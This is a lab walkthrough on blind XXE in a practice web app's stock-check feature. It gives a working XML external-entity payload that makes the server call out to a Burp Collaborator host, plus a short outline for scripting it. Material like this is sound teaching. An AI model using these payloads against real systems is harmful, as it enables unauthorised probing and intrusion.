### Lab: Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

_____

Analysis and Exploit:

1. Intercept the "Check stock" functionality via **[BURP-PROXY]**
    - POST **/product/stock**
    ``` xml
        <?xml version="1.0" encoding="UTF-8"?>  
        <stockCheck><productId>1</productId>
        <storeId>1</storeId></stockCheck>
    ```
2. **[BURP-REPEATER]** create the payload and send it
    ``` xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE jito [ <!ENTITY xxe SYSTEM 'http://xxe.burpcollaborator.net'> ] >
        <stockCheck><productId>&xxe;</productId>
        <storeId>1</storeId></stockCheck>
    ```
    - if "XML parsing error" and status code 400: works!

_____

Script:

1. Send payload | POST **/product/stock** | params: 'xml payload'
    ``` xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE jito [ <!ENTITY xxe SYSTEM 'http://xxe.burpcollaborator.net'> ] >
        <stockCheck><productId>&xxe;</productId>
        <storeId>1</storeId></stockCheck>
    ```
    - if "XML parsing error" not in response and status code != 400: stops